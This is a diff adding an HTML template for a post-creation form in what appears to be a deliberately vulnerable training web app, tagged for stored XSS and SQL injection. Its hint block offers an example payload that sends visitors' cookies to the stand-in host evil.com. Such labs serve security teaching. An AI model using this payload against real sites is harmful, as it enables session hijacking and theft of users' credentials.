@@ -1,0 +1,40 @@
+{% extends "base.html" %}
+
+{% block title %}New Post{% endblock %}
+
+{% block content %}
+<div class="container" style="max-width: 700px;">
+    <div class="card">
+        <div class="card-header">
+            <div class="card-icon orange">✍️</div>
+            <div>
+                <h2>Create New Post</h2>
+                <span class="vuln-tag xss">Stored XSS</span>
+                <span class="vuln-tag sqli">SQL Injection</span>
+            </div>
+        </div>
+        
+        <form method="POST">
+            <div class="form-group">
+                <label for="title">Title</label>
+                <input type="text" id="title" name="title" placeholder="Enter post title" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="content">Content</label>
+                <textarea id="content" name="content" placeholder="Write your post content here..." required></textarea>
+            </div>
+            
+            <div style="display: flex; gap: 1rem;">
+                <button type="submit" class="btn btn-primary">Publish Post →</button>
+                <a href="{{ url_for('dashboard') }}" class="btn btn-secondary">Cancel</a>
+            </div>
+        </form>
+        
+        <div class="hint" style="margin-top: 1.5rem;">
+            Try: <code>&lt;script&gt;document.location='http://evil.com?c='+document.cookie&lt;/script&gt;</code>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
